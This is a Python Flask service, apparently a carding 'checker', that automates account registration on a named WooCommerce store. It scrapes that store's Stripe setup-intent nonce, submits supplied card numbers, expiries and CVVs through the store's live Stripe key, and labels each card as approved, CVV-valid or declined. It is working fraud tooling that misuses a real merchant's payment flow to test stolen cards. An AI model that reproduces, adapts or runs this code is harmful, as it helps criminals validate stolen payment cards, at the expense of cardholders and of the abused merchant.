from flask import Flask, request, jsonify
import requests
import re
import json
import random
import time
import urllib3
from colorama import Fore, Style, init

# Initialize colorama
init()

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

class AccountManager:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://lolaandveranda.com"
        self.setup_headers()
        self.nonce = None
        self.account_created = False
        
    def setup_headers(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        }
        self.session.headers.update(self.headers)
    
    def extract_register_nonce(self, html_content):
        """Extract woocommerce-register-nonce from HTML"""
        pattern = r'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([a-f0-9]+)"'
        match = re.search(pattern, html_content)
        return match.group(1) if match else None
    
    def extract_wp_referer(self, html_content):
        """Extract _wp_http_referer from HTML"""
        pattern = r'name="_wp_http_referer" value="([^"]+)"'
        match = re.search(pattern, html_content)
        return match.group(1) if match else "/my-account/"
    
    def is_logged_in(self, html_content):
        """Check if registration was successful by looking for MyAccount navigation"""
        patterns = [
            r'woocommerce-MyAccount-navigation-link--dashboard',
            r'woocommerce-MyAccount-navigation-link--orders',
            r'woocommerce-MyAccount-navigation-link--payment-methods'
        ]
        return any(re.search(pattern, html_content) for pattern in patterns)
    
    def register_account(self, email, password):
        """Register a new account step by step"""
        try:
            # Step 1: Get the registration page to extract nonce
            response = self.session.get(
                f"{self.base_url}/my-account/", 
                timeout=30, 
                verify=False
            )
            response.raise_for_status()
            
            # Extract nonce and referer
            nonce = self.extract_register_nonce(response.text)
            wp_referer = self.extract_wp_referer(response.text)
            
            if not nonce:
                return False
            
            # Step 2: Register the account
            registration_data = {
                'email': email,
                'password': password,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://lolaandveranda.com/my-account/',
                'wc_order_attribution_session_start_time': '2025-10-21 15:16:55',
                'wc_order_attribution_session_pages': '4',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'woocommerce-register-nonce': nonce,
                '_wp_http_referer': wp_referer,
                'register': 'Register',
            }
            
            registration_headers = {
                'authority': 'lolaandveranda.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://lolaandveranda.com',
                'referer': 'https://lolaandveranda.com/my-account/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
            }
            
            response = self.session.post(
                f"{self.base_url}/my-account/",
                data=registration_data,
                headers=registration_headers,
                timeout=30,
                verify=False,
                allow_redirects=True
            )
            response.raise_for_status()
            
            # Step 3: Check if registration was successful
            if self.is_logged_in(response.text):
                self.account_created = True
                return True
            else:
                return False
                
        except Exception as e:
            return False

class NonceExtractor:
    def __init__(self, session):
        self.session = session
        
    def extract_nonce_multiple_methods(self, html_content):
        methods = [
            self._extract_via_direct_pattern,
            self._extract_via_stripe_params,
            self._extract_via_json_script,
            self._extract_via_fallback_pattern
        ]
        
        for method in methods:
            nonce = method(html_content)
            if nonce:
                return nonce
        return None
    
    def _extract_via_direct_pattern(self, html):
        pattern = r'"createAndConfirmSetupIntentNonce":"([a-f0-9]{10})"'
        match = re.search(pattern, html)
        return match.group(1) if match else None
    
    def _extract_via_stripe_params(self, html):
        pattern = r'var\s+wc_stripe_params\s*=\s*({[^}]+})'
        match = re.search(pattern, html)
        if match:
            try:
                json_str = match.group(1)
                json_str = re.sub(r',\s*}', '}', json_str)
                data = json.loads(json_str)
                return data.get('createAndConfirmSetupIntentNonce')
            except:
                pass
        return None
    
    def _extract_via_json_script(self, html):
        script_pattern = r'<script[^>]*>(.*?)</script>'
        scripts = re.findall(script_pattern, html, re.DOTALL)
        
        for script in scripts:
            if 'createAndConfirmSetupIntentNonce' in script:
                json_pattern = r'\{[^}]*(?:createAndConfirmSetupIntentNonce[^}]*)+[^}]*\}'
                json_matches = re.findall(json_pattern, script)
                for json_str in json_matches:
                    try:
                        clean_json = json_str.replace("'", '"')
                        data = json.loads(clean_json)
                        if 'createAndConfirmSetupIntentNonce' in data:
                            return data['createAndConfirmSetupIntentNonce']
                    except:
                        continue
        return None
    
    def _extract_via_fallback_pattern(self, html):
        patterns = [
            r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
            r'createAndConfirmSetupIntentNonce\s*=\s*["\']([a-f0-9]{10})["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
    
    def get_nonce(self, url="https://lolaandveranda.com/my-account/add-payment-method/"):
        try:
            response = self.session.get(url, timeout=30, verify=False)
            response.raise_for_status()
            
            nonce = self.extract_nonce_multiple_methods(response.text)
            return nonce
                
        except Exception as e:
            return None

def year_convert(year):
    """Convert year to 2-digit format if needed"""
    year = str(year).strip()
    if len(year) == 4:
        return year[2:]
    return year

def get_bin_info(bin_number):
    """Get BIN information from antipublic API"""
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                'bank': data.get('bank', 'Unknown'),
                'country': data.get('country_name', 'Unknown'),
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'level': data.get('level', 'Unknown')
            }
    except:
        pass
    
    return {
        'bank': 'Unknown',
        'country': 'Unknown', 
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown'
    }

def categorize_response(response_text):
    response = response_text.lower()
    
    approved_keywords = [
        "succeeded", "payment-success", "successfully", "thank you for your support",
        "your card does not support this type of purchase", "thank you",
        "membership confirmation", "/wishlist-member/?reg=", "thank you for your payment",
        "thank you for membership", "payment received", "your order has been received",
        "purchase successful", "approved"
    ]
    
    insufficient_keywords = [
        "insufficient funds", "insufficient_funds", "payment-successfully"
    ]
    
    auth_keywords = [
        "mutation_ok_result", "requires_action"
    ]

    ccn_cvv_keywords = [
        "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
        "incorrect_cvv", "invalid_cvv", "invalid cvv", ' "cvv_check": "pass" ',
        "cvv_check: pass", "security code is invalid", "security code is incorrect",
        "zip code is incorrect", "zip code is invalid", "card is declined by your bank",
        "lost_card", "stolen_card", "transaction_not_allowed", "pickup_card"
    ]

    live_keywords = [
        "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint"
    ]
    
    declined_keywords = [
        "declined", "invalid", "failed", "error", "incorrect"
    ]

    if any(kw in response for kw in approved_keywords):
        return "APPROVED", "🔥"
    elif any(kw in response for kw in ccn_cvv_keywords):
        return "CCN/CVV", "✅"
    elif any(kw in response for kw in live_keywords):
        return "3D LIVE", "✅"
    elif any(kw in response for kw in insufficient_keywords):
        return "INSUFFICIENT FUNDS", "💰"
    elif any(kw in response for kw in auth_keywords):
        return "STRIPE AUTH", "✅️"
    elif any(kw in response for kw in declined_keywords):
        return "DECLINED", "❌"
    else:
        return "UNKNOWN", "❓"

def setup_account_and_nonce():
    """Setup account and extract nonce for first card only"""
    account_manager = AccountManager()
    
    # Generate random credentials
    random_id = random.randint(1000, 9999)
    email = f"david{random_id}@gmail.com"
    password = f"o0P7u$hm4a2jMet{random_id}"
    
    # Register account
    if account_manager.register_account(email, password):
        # Extract setup intent nonce
        nonce_extractor = NonceExtractor(account_manager.session)
        nonce = nonce_extractor.get_nonce()
        
        if nonce:
            account_manager.nonce = nonce
            return account_manager
    
    return None

def parse_card_data(lista):
    """Parse card data from various formats"""
    # Remove any whitespace
    lista = lista.strip()
    
    # Split by | or /
    if '|' in lista:
        parts = lista.split('|')
    else:
        parts = lista.split('/')
    
    if len(parts) < 4:
        return None
    
    cc = parts[0].strip()
    
    # Parse month and year (handle different formats)
    month = parts[1].strip()
    year_part = parts[2].strip()
    cvv = parts[3].strip()
    
    # Handle month/year combinations
    if '/' in month:
        month_parts = month.split('/')
        month = month_parts[0].strip()
        if len(month_parts) > 1:
            year_part = month_parts[1].strip()
    
    if '/' in year_part:
        year_parts = year_part.split('/')
        year_part = year_parts[0].strip()
    
    # Convert year to 2-digit format
    year = year_convert(year_part)
    
    return {
        'cc': cc,
        'mes': month.zfill(2),
        'ano': year,
        'cvv': cvv
    }

def process_card(account_manager, cc, mes, ano, cvv):
    """Process a single card through the Stripe API"""
    ano1 = year_convert(ano)
    
    # Get BIN info for the card
    bin_info = get_bin_info(cc[:6])
    bank = bin_info['bank']
    country = bin_info['country']
    brand = bin_info['brand']
    card_type = bin_info['type']
    level = bin_info['level']
    
    try:
        # Step 1: Create payment method with Stripe
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        # Format card number with spaces as + for URL encoding
        formatted_card = cc.replace(" ", "+")
        
        # Build the exact same data format as the working script
        stripe_data = f'type=card&card[number]={formatted_card}&card[cvc]={cvv}&card[exp_year]={ano1[-2:]}&card[exp_month]={mes}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F4ee0ef76c3%3B+stripe-js-v3%2F4ee0ef76c3%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Flolaandveranda.com&time_on_page=55728&client_attribution_metadata[client_session_id]=1d14ad14-50c0-415f-b1cb-05d82bf92a4b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=879faec2-7ed5-4ee1-a1f3-7b10be480c9d&guid=59935264-a0ad-467b-8c25-e05e6e3941cb5cb1d3&muid=6ea35cc5-3766-416d-ba08-434b61fb526d436592&sid=4373bd82-91e4-4fb0-83ee-0ba0f724bcfdddf102&key=pk_live_51KvfxOAXdQYg3Kve5Dflq504Hy68DHhZfeB6eBPir5aY01s18bWHxpVRKRMRYy7kgoKkmCuNgmu7mDiL6WqIVsH7003wq0Cyi3&_stripe_version=2024-06-20'
        
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods', 
            headers=stripe_headers, 
            data=stripe_data,
            verify=False,
            timeout=30
        )
        
        # Check if payment method creation was successful
        if response.status_code != 200:
            error_detail = response.text
            try:
                error_json = response.json()
                if 'error' in error_json:
                    error_msg = error_json['error'].get('message', 'Unknown error')
                    return "DECLINED", error_msg, bank, country, brand, card_type, level
            except:
                pass
            return "DECLINED", f"API Error: {response.status_code}", bank, country, brand, card_type, level
        
        apx = response.json()
        
        # Check for errors in the response
        if 'error' in apx:
            error_msg = apx['error'].get('message', 'Unknown error')
            return "DECLINED", error_msg, bank, country, brand, card_type, level
        
        payment_method_id = apx.get("id")
        if not payment_method_id:
            return "UNKNOWN", "No payment method ID returned", bank, country, brand, card_type, level
        
        # Add delay between requests
        time.sleep(8)
        
        # Step 2: Confirm setup intent using the extracted nonce
        setup_headers = {
            'authority': 'lolaandveranda.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://lolaandveranda.com',
            'referer': 'https://lolaandveranda.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        setup_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': account_manager.nonce,
        }

        response = account_manager.session.post(
            'https://lolaandveranda.com/wp-admin/admin-ajax.php', 
            headers=setup_headers, 
            data=setup_data,
            verify=False,
            timeout=30
        )
        
        # Parse the response
        if response.status_code == 200:
            result = response.json()
            
            if result.get('success'):
                if result.get('data', {}).get('status') == 'succeeded':
                    status_msg = "Approved: Card Authorized Successfully"
                    category, emoji = categorize_response(status_msg)
                    return category, status_msg, bank, country, brand, card_type, level
                else:
                    # Check for error message
                    error_data = result.get('data', {})
                    if 'error' in error_data:
                        error_msg = error_data['error'].get('message', 'Unknown success response')
                    else:
                        error_msg = 'Unknown success response'
                    category, emoji = categorize_response(error_msg)
                    return category, error_msg, bank, country, brand, card_type, level
            else:
                # Extract error message
                error_data = result.get('data', {})
                if 'error' in error_data:
                    error_msg = error_data['error'].get('message', 'Unknown error')
                else:
                    error_msg = result.get('data', 'Unknown error')
                category, emoji = categorize_response(str(error_msg))
                return category, str(error_msg), bank, country, brand, card_type, level
        else:
            error_msg = f"HTTP Error: {response.status_code}"
            category, emoji = categorize_response(error_msg)
            return category, error_msg, bank, country, brand, card_type, level
            
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        category, emoji = categorize_response(error_msg)
        return category, error_msg, bank, country, brand, card_type, level

@app.route('/')
def home():
    return jsonify({
        "message": "Stripe Auth API",
        "author": "@GrandSiLes",
        "endpoint": "/chk",
        "usage": "GET /chk?lista=CCN|MM|YY|CVV"
    })

@app.route('/chk')
def check_card():
    lista = request.args.get('lista')
    
    if not lista:
        return jsonify({
            "error": "Missing lista parameter",
            "usage": "/chk?lista=CCN|MM|YY|CVV"
        }), 400
    
    # Parse card data
    card_data = parse_card_data(lista)
    if not card_data:
        return jsonify({
            "error": "Invalid card format",
            "valid_formats": [
                "ccn|mm|yy|cvv",
                "ccn|mm/yy|cvv", 
                "ccn|mm|yyyy|cvv",
                "ccn|mm/yyyy|cvv"
            ]
        }), 400
    
    cc = card_data['cc']
    mes = card_data['mes']
    ano = card_data['ano']
    cvv = card_data['cvv']
    
    # Setup account and get nonce
    account_manager = setup_account_and_nonce()
    if not account_manager:
        return jsonify({
            "error": "Failed to setup account and extract nonce"
        }), 500
    
    # Process the card
    category, message, bank, country, brand, card_type, level = process_card(
        account_manager, cc, mes, ano, cvv
    )
    
    # Format the response
    response_data = {
        "Author": "@GrandSiLes",
        "Bank": bank,
        "Brand": brand,
        "CC": f"{cc}|{mes}|{ano}|{cvv}",
        "Country": country,
        "Gateway": "Stripe Auth",
        "Level": level,
        "Response": {
            "status": category,
            "message": message
        },
        "Type": card_type
    }
    
    return jsonify(response_data)

@app.route('/health')
def health_check():
    return jsonify({"status": "healthy"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
